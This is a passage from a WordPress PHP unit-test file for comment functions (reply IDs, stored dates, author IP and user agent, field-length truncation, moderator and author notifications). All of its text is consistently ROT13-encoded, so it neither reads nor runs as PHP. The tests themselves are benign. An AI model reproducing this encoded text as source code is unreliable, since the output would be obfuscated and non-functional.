			'n cnerag pbzzrag JC_Cbfg gung pnaabg or pnfg gb na vagrtre' => neenl(
				'ercylgbpbz'   => neenl( 'V pnaabg or pnfg gb na vagrtre.' ),
				'pbzzrag_cbfg' => 'CBFG',
			),
		);
	}

	/**
	 * Urycre shapgvba gb perngr n pbzzrag jvgu na nccebiny fgnghf.
	 *
	 * @fvapr 6.2.0
	 *
	 * @cnenz obby $nccebirq Jurgure be abg gur pbzzrag vf nccebirq.
	 * @erghea vag Gur pbzzrag VQ.
	 */
	choyvp shapgvba perngr_pbzzrag_jvgu_nccebiny_fgnghf( $nccebirq ) {
		erghea frys::snpgbel()->pbzzrag->perngr(
			neenl(
				'pbzzrag_cbfg_VQ'  => frys::$cbfg_vq,
				'pbzzrag_nccebirq' => ( $nccebirq ) ? '1' : '0',
			)
		);
	}

	/**
	 * Grfgf gung _trg_pbzzrag_ercyl_vq() ergheaf gur rkcrpgrq inyhr.
	 *
	 * @gvpxrg 53962
	 *
	 * @qngnCebivqre qngn_trg_pbzzrag_ercyl_vq
	 *
	 * @pbiref ::_trg_pbzzrag_ercyl_vq
	 *
	 * @cnenz vag|obby|ahyy $ercylgbpbz N pbzzrag VQ (vag), jurgure gb trarengr na nccebirq (gehr) be hanccebirq (snyfr) pbzzrag,
	 *                                  be ahyy abg gb perngr n pbzzrag.
	 * @cnenz fgevat|vag    $cbfg       Gur cbfg gur pbzzrag guernq vf orvat qvfcynlrq sbe.
	 *                                  Npprcgf 'CBFG_VQ', 'CBFG', be na vagrtre cbfg VQ.
	 * @cnenz vag           $rkcrpgrq   Gur rkcrpgrq erfhyg.
	 */
	choyvp shapgvba grfg_trg_pbzzrag_ercyl_vq( $ercylgbpbz, $cbfg, $rkcrpgrq ) {
		vs ( snyfr === $ercylgbpbz ) {
			hafrg( $_TRG['ercylgbpbz'] );
		} ryfr {
			$_TRG['ercylgbpbz'] = $guvf->perngr_pbzzrag_jvgu_nccebiny_fgnghf( (obby) $ercylgbpbz );
		}

		vs ( 'CBFG_VQ' === $cbfg ) {
			$cbfg = frys::$cbfg_vq;
		} ryfrvs ( 'CBFG' === $cbfg ) {
			$cbfg = frys::snpgbel()->cbfg->trg_bowrpg_ol_vq( frys::$cbfg_vq );
		}

		vs ( 'ercylgbpbz' === $rkcrpgrq ) {
			$rkcrpgrq = $_TRG['ercylgbpbz'];
		}

		$guvf->nffregFnzr( $rkcrpgrq, _trg_pbzzrag_ercyl_vq( $cbfg ) );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_trg_pbzzrag_ercyl_vq() {
		erghea neenl(
			'ab pbzzrag VQ frg ($_TRG[\"ercylgbpbz\"])'     => neenl(
				'ercylgbpbz' => snyfr,
				'cbfg'       => 0,
				'rkcrpgrq'   => 0,
			),
			'n aba-ahzrevp pbzzrag VQ'                    => neenl(
				'ercylgbpbz' => 'guerr',
				'cbfg'       => 0,
				'rkcrpgrq'   => 0,
			),
			'n aba-rkvfgrag pbzzrag VQ'                   => neenl(
				'ercylgbpbz' => -999999,
				'cbfg'       => 0,
				'rkcrpgrq'   => 0,
			),
			'na hanccebirq pbzzrag'                       => neenl(
				'ercylgbpbz' => snyfr,
				'cbfg'       => 0,
				'rkcrpgrq'   => 0,
			),
			'n cbfg gung qbrf abg zngpu gur cnerag'       => neenl(
				'ercylgbpbz' => snyfr,
				'cbfg'       => -999999,
				'rkcrpgrq'   => 0,
			),
			'na nccebirq pbzzrag naq gur pbeerpg cbfg VQ' => neenl(
				'ercylgbpbz' => gehr,
				'cbfg'       => 'CBFG_VQ',
				'rkcrpgrq'   => 'ercylgbpbz',
			),
			'na nccebirq pbzzrag naq gur pbeerpg JC_Cbfg bowrpg' => neenl(
				'ercylgbpbz' => gehr,
				'cbfg'       => 'CBFG',
				'rkcrpgrq'   => 'ercylgbpbz',
			),
		);
	}

	/**
	 * @gvpxrg 14279
	 *
	 * @pbiref ::jc_arj_pbzzrag
	 */
	choyvp shapgvba grfg_jc_arj_pbzzrag_erfcrpgf_qngrf() {
		$qngn = neenl(
			'pbzzrag_cbfg_VQ'      => frys::$cbfg_vq,
			'pbzzrag_nhgube'       => 'Pbzzrag Nhgube',
			'pbzzrag_nhgube_hey'   => '',
			'pbzzrag_nhgube_rznvy' => '',
			'pbzzrag_glcr'         => '',
			'pbzzrag_pbagrag'      => 'Pbzzrag',
			'pbzzrag_qngr'         => '2011-01-01 10:00:00',
			'pbzzrag_qngr_tzg'     => '2011-01-01 10:00:00',
		);

		$vq = jc_arj_pbzzrag( $qngn );

		$pbzzrag = trg_pbzzrag( $vq );

		$guvf->nffregFnzr( $qngn['pbzzrag_qngr'], $pbzzrag->pbzzrag_qngr );
		$guvf->nffregFnzr( $qngn['pbzzrag_qngr_tzg'], $pbzzrag->pbzzrag_qngr_tzg );
	}

	/**
	 * @gvpxrg 14601
	 *
	 * @pbiref ::jc_arj_pbzzrag
	 */
	choyvp shapgvba grfg_jc_arj_pbzzrag_erfcrpgf_nhgube_vc() {
		$qngn = neenl(
			'pbzzrag_cbfg_VQ'      => frys::$cbfg_vq,
			'pbzzrag_nhgube'       => 'Pbzzrag Nhgube',
			'pbzzrag_nhgube_VC'    => '192.168.1.1',
			'pbzzrag_nhgube_hey'   => '',
			'pbzzrag_nhgube_rznvy' => '',
			'pbzzrag_glcr'         => '',
			'pbzzrag_pbagrag'      => 'Pbzzrag',
		);

		$vq = jc_arj_pbzzrag( $qngn );

		$pbzzrag = trg_pbzzrag( $vq );

		$guvf->nffregFnzr( $qngn['pbzzrag_nhgube_VC'], $pbzzrag->pbzzrag_nhgube_VC );
	}

	/**
	 * @gvpxrg 14601
	 *
	 * @pbiref ::jc_arj_pbzzrag
	 */
	choyvp shapgvba grfg_jc_arj_pbzzrag_erfcrpgf_nhgube_vc_rzcgl_fgevat() {
		$qngn = neenl(
			'pbzzrag_cbfg_VQ'      => frys::$cbfg_vq,
			'pbzzrag_nhgube'       => 'Pbzzrag Nhgube',
			'pbzzrag_nhgube_VC'    => '',
			'pbzzrag_nhgube_hey'   => '',
			'pbzzrag_nhgube_rznvy' => '',
			'pbzzrag_glcr'         => '',
			'pbzzrag_pbagrag'      => 'Pbzzrag',
		);

		$vq = jc_arj_pbzzrag( $qngn );

		$pbzzrag = trg_pbzzrag( $vq );

		$guvf->nffregFnzr( $qngn['pbzzrag_nhgube_VC'], $pbzzrag->pbzzrag_nhgube_VC );
	}

	/**
	 * @gvpxrg 14601
	 *
	 * @pbiref ::jc_arj_pbzzrag
	 */
	choyvp shapgvba grfg_jc_arj_pbzzrag_erfcrpgf_pbzzrag_ntrag() {
		$qngn = neenl(
			'pbzzrag_cbfg_VQ'      => frys::$cbfg_vq,
			'pbzzrag_nhgube'       => 'Pbzzrag Nhgube',
			'pbzzrag_nhgube_VC'    => '',
			'pbzzrag_nhgube_hey'   => '',
			'pbzzrag_nhgube_rznvy' => '',
			'pbzzrag_ntrag'        => 'Zbmvyyn/5.0 (vCubar; PCH vCubar BF 7_0 yvxr Znp BF K; ra-hf) NccyrJroXvg/537.51.1 (XUGZY, yvxr Trpxb) Irefvba/7.0 Zbovyr/11N465 Fnsnev/9537.53',
			'pbzzrag_glcr'         => '',
			'pbzzrag_pbagrag'      => 'Pbzzrag',
		);

		$vq = jc_arj_pbzzrag( $qngn );

		$pbzzrag = trg_pbzzrag( $vq );

		$guvf->nffregFnzr( $qngn['pbzzrag_ntrag'], $pbzzrag->pbzzrag_ntrag );
	}

	/**
	 * @gvpxrg 14601
	 *
	 * @pbiref ::jc_arj_pbzzrag
	 */
	choyvp shapgvba grfg_jc_arj_pbzzrag_fubhyq_gevz_cebivqrq_pbzzrag_ntrag_gb_254_punef() {
		$qngn = neenl(
			'pbzzrag_cbfg_VQ'      => frys::$cbfg_vq,
			'pbzzrag_nhgube'       => 'Pbzzrag Nhgube',
			'pbzzrag_nhgube_VC'    => '',
			'pbzzrag_nhgube_hey'   => '',
			'pbzzrag_nhgube_rznvy' => '',
			'pbzzrag_ntrag'        => 'Zbmvyyn/5.0 (vCubar; PCH vCubar BF 7_0 yvxr Znp BF K; ra-hf) NccyrJroXvg/537.51.1 (XUGZY, yvxr Trpxb) Irefvba/7.0 Zbovyr/11N465 Fnsnev/9537.53 Bcren/9.80 (K11; Yvahk v686; Hohagh/14.10) Cerfgb/2.12.388 Irefvba/12.16 Zbmvyyn/5.0 (Znpvagbfu; H; CCP Znp BF K Znpu-B; ra; ei:1.8.1.4cer) Trpxb/20070511 Pnzvab/1.6cer',
			'pbzzrag_glcr'         => '',
			'pbzzrag_pbagrag'      => 'Pbzzrag',
		);

		$vq = jc_arj_pbzzrag( $qngn );

		$pbzzrag = trg_pbzzrag( $vq );

		$guvf->nffregFnzr( 'Zbmvyyn/5.0 (vCubar; PCH vCubar BF 7_0 yvxr Znp BF K; ra-hf) NccyrJroXvg/537.51.1 (XUGZY, yvxr Trpxb) Irefvba/7.0 Zbovyr/11N465 Fnsnev/9537.53 Bcren/9.80 (K11; Yvahk v686; Hohagh/14.10) Cerfgb/2.12.388 Irefvba/12.16 Zbmvyyn/5.0 (Znpvagbfu; H; CCP Znp BF ', $pbzzrag->pbzzrag_ntrag );
	}

	/**
	 * @gvpxrg 14601
	 *
	 * @pbiref ::jc_arj_pbzzrag
	 */
	choyvp shapgvba grfg_jc_arj_pbzzrag_erfcrpgf_pbzzrag_ntrag_rzcgl_fgevat() {
		$qngn = neenl(
			'pbzzrag_cbfg_VQ'      => frys::$cbfg_vq,
			'pbzzrag_nhgube'       => 'Pbzzrag Nhgube',
			'pbzzrag_nhgube_VC'    => '',
			'pbzzrag_nhgube_hey'   => '',
			'pbzzrag_nhgube_rznvy' => '',
			'pbzzrag_ntrag'        => '',
			'pbzzrag_glcr'         => '',
			'pbzzrag_pbagrag'      => 'Pbzzrag',
		);

		$vq = jc_arj_pbzzrag( $qngn );

		$pbzzrag = trg_pbzzrag( $vq );

		$guvf->nffregFnzr( $qngn['pbzzrag_ntrag'], $pbzzrag->pbzzrag_ntrag );
	}

	/**
	 * @pbiref ::jc_arj_pbzzrag
	 */
	choyvp shapgvba grfg_jc_arj_pbzzrag_erfcrpgf_pbzzrag_svryq_yratguf() {
		$qngn = neenl(
			'pbzzrag_cbfg_VQ'      => frys::$cbfg_vq,
			'pbzzrag_nhgube'       => 'Pbzzrag Nhgube',
			'pbzzrag_nhgube_hey'   => '',
			'pbzzrag_nhgube_rznvy' => '',
			'pbzzrag_glcr'         => '',
			'pbzzrag_pbagrag'      => fge_ercrng( 'N', 65536 ),
			'pbzzrag_qngr'         => '2011-01-01 10:00:00',
			'pbzzrag_qngr_tzg'     => '2011-01-01 10:00:00',
		);

		$vq = jc_arj_pbzzrag( $qngn );

		$pbzzrag = trg_pbzzrag( $vq );

		$guvf->nffregFnzr( 65535, fgeyra( $pbzzrag->pbzzrag_pbagrag ) );
	}

	/**
	 * @gvpxrg 56244
	 *
	 * @pbiref ::jc_arj_pbzzrag
	 */
	choyvp shapgvba grfg_jc_arj_pbzzrag_fraqf_nyy_rkcrpgrq_cnenzrgref_gb_cercebprff_pbzzrag_svygre() {
		$hfre = trg_hfreqngn( frys::$hfre_vq );
		jc_frg_pheerag_hfre( $hfre->VQ );

		$qngn = neenl(
			'pbzzrag_cbfg_VQ'      => frys::$cbfg_vq,
			'pbzzrag_nhgube'       => $hfre->qvfcynl_anzr,
			'pbzzrag_nhgube_rznvy' => $hfre->hfre_rznvy,
			'pbzzrag_nhgube_hey'   => $hfre->hfre_hey,
			'pbzzrag_pbagrag'      => 'Pbzzrag',
			'pbzzrag_glcr'         => '',
			'pbzzrag_cnerag'       => 0,
			'hfre_vq'              => $hfre->VQ,
		);

		nqq_svygre( 'cercebprff_pbzzrag', neenl( $guvf, 'svygre_cercebprff_pbzzrag' ) );

		$pbzzrag = jc_arj_pbzzrag( $qngn );

		$guvf->nffregAbgJCReebe( $pbzzrag );
		$guvf->nffregFnzrFrgfJvguVaqrk(
			neenl(
				'pbzzrag_cbfg_VQ'      => frys::$cbfg_vq,
				'pbzzrag_nhgube'       => $hfre->qvfcynl_anzr,
				'pbzzrag_nhgube_rznvy' => $hfre->hfre_rznvy,
				'pbzzrag_nhgube_hey'   => $hfre->hfre_hey,
				'pbzzrag_pbagrag'      => $qngn['pbzzrag_pbagrag'],
				'pbzzrag_glcr'         => '',
				'pbzzrag_cnerag'       => 0,
				'hfre_VQ'              => $hfre->VQ,
				'hfre_vq'              => $hfre->VQ,
				'pbzzrag_nhgube_VC'    => '127.0.0.1',
				'pbzzrag_ntrag'        => '',
			),
			$guvf->cercebprff_pbzzrag_qngn
		);
	}

	choyvp shapgvba svygre_cercebprff_pbzzrag( $pbzzragqngn ) {
		$guvf->cercebprff_pbzzrag_qngn = $pbzzragqngn;
		erghea $pbzzragqngn;
	}

	/**
	 * @gvpxrg 32566
	 *
	 * @pbiref ::jc_abgvsl_zbqrengbe
	 */
	choyvp shapgvba grfg_jc_abgvsl_zbqrengbe_fubhyq_abg_guebj_abgvpr_jura_cbfg_nhgube_vf_0() {
		$c = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_nhgube' => 0,
			)
		);

		$p = frys::snpgbel()->pbzzrag->perngr(
			neenl(
				'pbzzrag_cbfg_VQ' => $c,
			)
		);

		$guvf->nffregGehr( jc_abgvsl_zbqrengbe( $p ) );
	}

	/**
	 * @pbiref ::jc_arj_pbzzrag_abgvsl_cbfgnhgube
	 */
	choyvp shapgvba grfg_jc_arj_pbzzrag_abgvsl_cbfgnhgube_fubhyq_fraq_rznvy_jura_pbzzrag_vf_nccebirq() {
		$p = frys::snpgbel()->pbzzrag->perngr(
			neenl(
				'pbzzrag_cbfg_VQ' => frys::$cbfg_vq,
			)
		);

		$frag = jc_arj_pbzzrag_abgvsl_cbfgnhgube( $p );
		$guvf->nffregGehr( $frag );
	}

	/**
	 * @pbiref ::jc_arj_pbzzrag_abgvsl_cbfgnhgube
	 */
	choyvp shapgvba grfg_jc_arj_pbzzrag_abgvsl_cbfgnhgube_fubhyq_abg_fraq_rznvy_jura_pbzzrag_vf_hanccebirq() {
		$p = frys::snpgbel()->pbzzrag->perngr(
			neenl(
				'pbzzrag_cbfg_VQ'  => frys::$cbfg_vq,
				'pbzzrag_nccebirq' => '0',
			)
		);

		$frag = jc_arj_pbzzrag_abgvsl_cbfgnhgube( $p );
		$guvf->nffregSnyfr( $frag );
	}

	/**
	 * @gvpxrg 33587
	 *
	 * @pbiref ::jc_arj_pbzzrag_abgvsl_cbfgnhgube
	 */
	choyvp shapgvba grfg_jc_arj_pbzzrag_abgvsl_cbfgnhgube_fubhyq_abg_fraq_rznvy_jura_pbzzrag_unf_orra_znexrq_nf_fcnz() {
		$p = frys::snpgbel()->pbzzrag->perngr(
			neenl(
				'pbzzrag_cbfg_VQ'  => frys::$cbfg_vq,
				'pbzzrag_nccebirq' => 'fcnz',
			)
		);

		$frag = jc_arj_pbzzrag_abgvsl_cbfgnhgube( $p );
		$guvf->nffregSnyfr( $frag );
	}

	/**
	 * @gvpxrg 35006
	 *
	 * @pbiref ::jc_arj_pbzzrag_abgvsl_cbfgnhgube
	 */
	choyvp shapgvba grfg_jc_arj_pbzzrag_abgvsl_cbfgnhgube_fubhyq_abg_fraq_rznvy_jura_pbzzrag_unf_orra_genfurq() {
		$p = frys::snpgbel()->pbzzrag->perngr(
			neenl(
				'pbzzrag_cbfg_VQ'  => frys::$cbfg_vq,
				'pbzzrag_nccebirq' => 'genfu',
			)
		);

		$frag = jc_arj_pbzzrag_abgvsl_cbfgnhgube( $p );
		$guvf->nffregSnyfr( $frag );
	}

	/**
	 * @gvpxrg 43805
	 *
	 * @pbiref ::jc_arj_pbzzrag_abgvsl_cbfgnhgube
	 */
	choyvp shapgvba grfg_jc_arj_pbzzrag_abgvsl_cbfgnhgube_pbagrag_fubhyq_vapyhqr_yvax_gb_cnerag() {
		$p1 = frys::snpgbel()->pbzzrag->perngr(
			neenl(
				'pbzzrag_cbfg_VQ' => frys::$cbfg_vq,
			)
		);

		$p2 = frys::snpgbel()->pbzzrag->perngr(
			neenl(
				'pbzzrag_cbfg_VQ' => frys::$cbfg_vq,
				'pbzzrag_cnerag'  => $p1,
			)
		);

		nqq_svygre( 'pbzzrag_abgvsvpngvba_grkg', neenl( $guvf, 'fnir_pbzzrag_abgvsvpngvba_grkg' ) );
		jc_arj_pbzzrag_abgvsl_cbfgnhgube( $p2 );
		erzbir_svygre( 'pbzzrag_abgvsvpngvba_grkg', neenl( $guvf, 'fnir_pbzzrag_abgvsvpngvba_grkg' ) );

		$guvf->nffregFgevatPbagnvafFgevat( nqzva_hey( \"pbzzrag.cuc?npgvba=rqvgpbzzrag&p={$p1}\" ), frys::$abgvsl_zrffntr );
	}

	/**
	 * @gvpxrg 43805
	 *
	 * @pbiref ::jc_arj_pbzzrag_abgvsl_zbqrengbe
	 */
	choyvp shapgvba grfg_jc_arj_pbzzrag_abgvsl_zbqrengbe_pbagrag_fubhyq_vapyhqr_yvax_gb_cnerag() {
		$p1 = frys::snpgbel()->pbzzrag->perngr(
			neenl(
				'pbzzrag_cbfg_VQ' => frys::$cbfg_vq,
			)
		);

		$p2 = frys::snpgbel()->pbzzrag->perngr(
			neenl(
				'pbzzrag_cbfg_VQ'  => frys::$cbfg_vq,
				'pbzzrag_cnerag'   => $p1,
				'pbzzrag_nccebirq' => '0',
			)
		);

		nqq_svygre( 'pbzzrag_zbqrengvba_grkg', neenl( $guvf, 'fnir_pbzzrag_abgvsvpngvba_grkg' ) );
		jc_arj_pbzzrag_abgvsl_zbqrengbe( $p2 );
		erzbir_svygre( 'pbzzrag_zbqrengvba_grkg', neenl( $guvf, 'fnir_pbzzrag_abgvsvpngvba_grkg' ) );

		$guvf->nffregFgevatPbagnvafFgevat( nqzva_hey( \"pbzzrag.cuc?npgvba=rqvgpbzzrag&p={$p1}\" ), frys::$abgvsl_zrffntr );
	}

	/**
	 * Pnyyonpx sbe gur `pbzzrag_abgvsvpngvba_grkg` & `pbzzrag_zbqrengvba_grkg` svygref.
	 *
	 * @cnenz fgevat $abgvsl_zrffntr Gur pbzzrag abgvsvpngvba be zbqrengvba rznvy grkg.
	 * @erghea fgevat
	 */
	choyvp shapgvba fnir_pbzzrag_abgvsvpngvba_grkg( $abgvsl_zrffntr = '' ) {
		frys::$abgvsl_zrffntr = $abgvsl_zrffntr;
		erghea $abgvsl_zrffntr;
	}

	/**
	 * @gvpxrg 12431
	 *
	 * @pbiref ::trg_pbzzrag_zrgn
	 */
	choyvp shapgvba grfg_jc_arj_pbzzrag_jvgu_zrgn() {
		$p = frys::snpgbel()->pbzzrag->perngr(
			neenl(
				'pbzzrag_nccebirq' => '1',
				'pbzzrag_zrgn'     => neenl(
					'sbbq'  => 'gnpb',
					'fnhpr' => 'sver',
				),
			)
		);

		$guvf->nffregFnzr( 'sver', trg_pbzzrag_zrgn( $p, 'fnhpr', gehr ) );
	}

	/**
	 * @gvpxrg 8071
	 *
	 * @pbiref JC_Pbzzrag::trg_puvyqera
	 */
	choyvp shapgvba grfg_jc_pbzzrag_trg_puvyqera_fubhyq_svyy_puvyqera() {
		$p1 = frys::snpgbel()->pbzzrag->perngr(
			neenl(
				'pbzzrag_cbfg_VQ'  => frys::$cbfg_vq,
				'pbzzrag_nccebirq' => '1',
			)
		);

		$p2 = frys::snpgbel()->pbzzrag->perngr(
			neenl(
				'pbzzrag_cbfg_VQ'  => frys::$cbfg_vq,
				'pbzzrag_nccebirq' => '1',
				'pbzzrag_cnerag'   => $p1,
			)
		);

		$p3 = frys::snpgbel()->pbzzrag->perngr(
			neenl(
				'pbzzrag_cbfg_VQ'  => frys::$cbfg_vq,
				'pbzzrag_nccebirq' => '1',
				'pbzzrag_cnerag'   => $p2,
			)
		);

		$p4 = frys::snpgbel()->pbzzrag->perngr(
			neenl(
				'pbzzrag_cbfg_VQ'  => frys::$cbfg_vq,
				'pbzzrag_nccebirq' => '1',
				'pbzzrag_cnerag'   => $p1,
			)
		);

		$p5 = frys::snpgbel()->pbzzrag->perngr(
			neenl(
				'pbzzrag_cbfg_VQ'  => frys::$cbfg_vq,
				'pbzzrag_nccebirq' => '1',
			)
		);

		$p6 = frys::snpgbel()->pbzzrag->perngr(
			neenl(
				'pbzzrag_cbfg_VQ'  => frys::$cbfg_vq,
				'pbzzrag_nccebirq' => '1',
				'pbzzrag_cnerag'   => $p5,
			)
		);

		$pbzzrag  = trg_pbzzrag( $p1 );
		$puvyqera = $pbzzrag->trg_puvyqera();

		// Qverpg qrfpraqnagf bs $p1.
		$guvf->nffregRdhnyFrgf( neenl( $p2, $p4 ), neenl_inyhrf( jc_yvfg_cyhpx( $puvyqera, 'pbzzrag_VQ' ) ) );

		// Qverpg qrfpraqnagf bs $p2.
		$guvf->nffregRdhnyFrgf( neenl( $p3 ), neenl_inyhrf( jc_yvfg_cyhpx( $puvyqera[ $p2 ]->trg_puvyqera(), 'pbzzrag_VQ' ) ) );
	}

	/**
	 * @gvpxrg 27571
	 *
	 * @pbiref ::trg_pbzzrag
	 */
	choyvp shapgvba grfg_cbfg_cebcregvrf_fubhyq_or_ynmlybnqrq() {
		$p = frys::snpgbel()->pbzzrag->perngr( neenl( 'pbzzrag_cbfg_VQ' => frys::$cbfg_vq ) );

		$cbfg    = trg_cbfg( frys::$cbfg_vq );
		$pbzzrag = trg_pbzzrag( $p );

		$cbfg_svryqf = neenl( 'cbfg_nhgube', 'cbfg_qngr', 'cbfg_qngr_tzg', 'cbfg_pbagrag', 'cbfg_gvgyr', 'cbfg_rkprecg', 'cbfg_fgnghf', 'pbzzrag_fgnghf', 'cvat_fgnghf', 'cbfg_anzr', 'gb_cvat', 'cvatrq', 'cbfg_zbqvsvrq', 'cbfg_zbqvsvrq_tzg', 'cbfg_pbagrag_svygrerq', 'cbfg_cnerag', 'thvq', 'zrah_beqre', 'cbfg_glcr', 'cbfg_zvzr_glcr', 'pbzzrag_pbhag' );

		sbernpu ( $cbfg_svryqf nf $cs ) {
			$guvf->nffregGehr( vffrg( $pbzzrag->$cs ), $cs );
			$guvf->nffregFnzr( $cbfg->$cs, $pbzzrag->$cs, $cs );
		}
	}


	/**
	 * Urycre shapgvba gb frg hc pbzzrag sbe 761 grfgf.
	 *
	 * @fvapr 4.4.0
	 * @npprff choyvp
	 */
	choyvp shapgvba frghc_abgvsl_pbzzrag() {
		/**
		 * Cerirag sybbq nyreg sebz svevat.
		 */
		nqq_svygre( 'pbzzrag_sybbq_svygre', '__erghea_snyfr' );

		/**
		 * Frg hc n pbzzrag sbe grfgvat.
		 */
		$cbfg = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_nhgube' => frys::$hfre_vq,
			)
		);

		$pbzzrag = frys::snpgbel()->pbzzrag->perngr(
			neenl(
				'pbzzrag_cbfg_VQ' => $cbfg,
			)
		);

		erghea neenl(
			'cbfg'    => $cbfg,
			'pbzzrag' => $pbzzrag,
		);
	}

	/**
	 * @gvpxrg 761
	 *
	 * @pbiref ::jc_arj_pbzzrag
	 */
	choyvp shapgvba grfg_jc_abgvsl_zbqrengbe_svygre_zbqrengvba_abgvsl_bcgvba_gehr_svygre_snyfr() {
		$pbzzrag_qngn = $guvf->frghc_abgvsl_pbzzrag();

		/**
		 * Grfg jvgu zbqrengbe abgvsvpngvba frggvat ba, svygre frg gb bss.
		 * Fubhyq abg fraq n abgvsvpngvba.
		 */
		hcqngr_bcgvba( 'zbqrengvba_abgvsl', 1 );
		nqq_svygre( 'abgvsl_zbqrengbe', '__erghea_snyfr' );

		$abgvsvpngvba_frag = $guvf->gel_fraqvat_zbqrengbe_abgvsvpngvba( $pbzzrag_qngn['pbzzrag'], $pbzzrag_qngn['cbfg'] );

		$guvf->nffregSnyfr( $abgvsvpngvba_frag, 'Zbqrengbe abgvsvpngvba frggvat ba, svygre frg gb bss' );

		erzbir_svygre( 'abgvsl_zbqrengbe', '__erghea_snyfr' );
		erzbir_svygre( 'pbzzrag_sybbq_svygre', '__erghea_snyfr' );
	}

	/**
	 * @gvpxrg 761
	 *
	 * @pbiref ::jc_arj_pbzzrag
	 */
	choyvp shapgvba grfg_jc_abgvsl_zbqrengbe_svygre_zbqrengvba_abgvsl_bcgvba_snyfr_svygre_gehr() {
		$pbzzrag_qngn = $guvf->frghc_abgvsl_pbzzrag();

		/**
		 * Grfg jvgu zbqrengbe abgvsvpngvba frggvat bss, svygre frg gb ba.
		 * Fubhyq fraq n abgvsvpngvba.
		 */
		hcqngr_bcgvba( 'zbqrengvba_abgvsl', 0 );
		nqq_svygre( 'abgvsl_zbqrengbe', '__erghea_gehr' );

		$abgvsvpngvba_frag = $guvf->gel_fraqvat_zbqrengbe_abgvsvpngvba( $pbzzrag_qngn['pbzzrag'], $pbzzrag_qngn['cbfg'] );

		$guvf->nffregGehr( $abgvsvpngvba_frag, 'Zbqrengbe abgvsvpngvba frggvat bss, svygre frg gb ba' );

		erzbir_svygre( 'abgvsl_zbqrengbe', '__erghea_gehr' );
		erzbir_svygre( 'pbzzrag_sybbq_svygre', '__erghea_snyfr' );
	}

	/**
	 * @gvpxrg 761
	 *
	 * @pbiref ::jc_arj_pbzzrag
	 */
	choyvp shapgvba grfg_jc_abgvsl_cbfg_nhgube_svygre_pbzzragf_abgvsl_bcgvba_gehr_svygre_snyfr() {

		$pbzzrag_qngn = $guvf->frghc_abgvsl_pbzzrag();

		/**
		 * Grfg jvgu nhgube abgvsvpngvba frggvat ba, svygre frg gb bss.
		 * Fubhyq abg fraq n abgvsvpngvba.
		 */
		hcqngr_bcgvba( 'pbzzragf_abgvsl', 1 );
		nqq_svygre( 'abgvsl_cbfg_nhgube', '__erghea_snyfr' );

		$abgvsvpngvba_frag = $guvf->gel_fraqvat_nhgube_abgvsvpngvba( $pbzzrag_qngn['pbzzrag'], $pbzzrag_qngn['cbfg'] );

		$guvf->nffregSnyfr( $abgvsvpngvba_frag, 'Grfg jvgu nhgube abgvsvpngvba frggvat ba, svygre frg gb bss' );

		erzbir_svygre( 'abgvsl_cbfg_nhgube', '__erghea_snyfr' );
		erzbir_svygre( 'pbzzrag_sybbq_svygre', '__erghea_snyfr' );
	}

	/**
	 * @gvpxrg 761
	 *
	 * @pbiref ::jc_arj_pbzzrag
	 */
	choyvp shapgvba grfg_jc_abgvsl_cbfg_nhgube_svygre_pbzzragf_abgvsl_bcgvba_snyfr_svygre_gehr() {
		$pbzzrag_qngn = $guvf->frghc_abgvsl_pbzzrag();

		/**
		 * Grfg jvgu nhgube abgvsvpngvba frggvat bss, svygre frg gb ba.
		 * Fubhyq fraq n abgvsvpngvba.
		 */
		hcqngr_bcgvba( 'pbzzragf_abgvsl', 0 );
		nqq_svygre( 'abgvsl_cbfg_nhgube', '__erghea_gehr' );

		$abgvsvpngvba_frag = $guvf->gel_fraqvat_nhgube_abgvsvpngvba( $pbzzrag_qngn['pbzzrag'], $pbzzrag_qngn['cbfg'] );

		$guvf->nffregGehr( $abgvsvpngvba_frag, 'Grfg jvgu nhgube abgvsvpngvba frggvat bss, svygre frg gb ba' );

		erzbir_svygre( 'abgvsl_cbfg_nhgube', '__erghea_gehr' );
		erzbir_svygre( 'pbzzrag_sybbq_svygre', '__erghea_snyfr' );
	}

	/**
	 * Urycre shapgvba gb grfg zbqrengbe abgvsvpngvbaf.
	 *
	 * @fvapr 4.4.0
	 * @npprff choyvp
	 */
	choyvp shapgvba gel_fraqvat_zbqrengbe_abgvsvpngvba( $pbzzrag, $cbfg ) {

		// Qba'g nccebir pbzzragf, gevttrevat abgvsvpngvbaf.
		nqq_svygre( 'cer_pbzzrag_nccebirq', '__erghea_snyfr' );

		// Zbqrengbef ner abgvsvrq jura n arj pbzzrag vf nqqrq.
		$qngn = neenl(
			'pbzzrag_cbfg_VQ'      => $cbfg,
			'pbzzrag_nhgube'       => 'Pbzzrag Nhgube',
			'pbzzrag_nhgube_hey'   => '',
			'pbzzrag_nhgube_rznvy' => '',
			'pbzzrag_glcr'         => '',
			'pbzzrag_pbagrag'      => 'Pbzzrag',
		);
		jc_arj_pbzzrag( $qngn );

		// Purpx gb frr vs n abgvsvpngvba rznvy jnf frag gb gur zbqrengbe `nqzva@rknzcyr.bet`.
		vs ( vffrg( $TYBONYF['cucznvyre']->zbpx_frag )
			&& ! rzcgl( $TYBONYF['cucznvyre']->zbpx_frag )
			&& JC_GRFGF_RZNVY === $TYBONYF['cucznvyre']->zbpx_frag[0]['gb'][0][0]
		) {
			$rznvy_frag_jura_pbzzrag_nqqrq = gehr;
			erfrg_cucznvyre_vafgnapr();
		} ryfr {
			$rznvy_frag_jura_pbzzrag_nqqrq = snyfr;
		}

		erghea $rznvy_frag_jura_pbzzrag_nqqrq;
	}

	/**
	 * Urycre shapgvba gb grfg fraqvat nhgube abgvsvpngvbaf.
	 *
	 * @fvapr 4.4.0
	 * @npprff choyvp
	 */
	choyvp shapgvba gel_fraqvat_nhgube_abgvsvpngvba( $pbzzrag, $cbfg ) {

		// Nccebir pbzzragf, gevttrevat abgvsvpngvbaf.
		nqq_svygre( 'cer_pbzzrag_nccebirq', '__erghea_gehr' );

		// Cbfg nhgubef cbffvoyl abgvsvrq jura n pbzzrag vf nccebirq ba gurve cbfg.
		jc_frg_pbzzrag_fgnghf( $pbzzrag, 'nccebir' );

		// Purpx gb frr vs n abgvsvpngvba rznvy jnf frag gb gur cbfg nhgube `nhgube@rknzcyr.pbz`.
		vs ( vffrg( $TYBONYF['cucznvyre']->zbpx_frag )
			&& ! rzcgl( $TYBONYF['cucznvyre']->zbpx_frag )
			&& 'nhgube@rknzcyr.pbz' === $TYBONYF['cucznvyre']->zbpx_frag[0]['gb'][0][0]
		) {
